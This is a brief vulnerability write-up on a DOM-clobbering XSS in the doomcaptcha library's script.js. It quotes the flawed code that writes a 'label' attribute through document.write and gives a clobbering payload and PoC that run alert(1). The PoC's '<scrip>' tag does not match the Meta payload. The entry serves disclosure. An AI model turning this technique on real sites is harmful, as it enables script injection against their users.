## doomcaptcha

### Meta

+ Library: doomcaptcha
+ Payload: ```<img name=currentScript label="<script>alert(1)</script>"></img>```
+ Impact: XSS
+ Foundby: TheHulk

### Library

URL:
+ `https://github.com/vivirenremoto/doomcaptcha/blob/main/script.js`

### Vulnerable Code Snippet

```javascript
var captcha_label = document.currentScript.getAttribute('label');

var captcha_html = '';
if (captcha_label) {
    captcha_html = '<p>' + captcha_label + '<br>';
}

document.write(captcha_html);
```

## PoC

```
<img name=currentScript label="<scrip>alert(1)</script>"></img>

<form>
<script src=script.js></script>
</form>
```
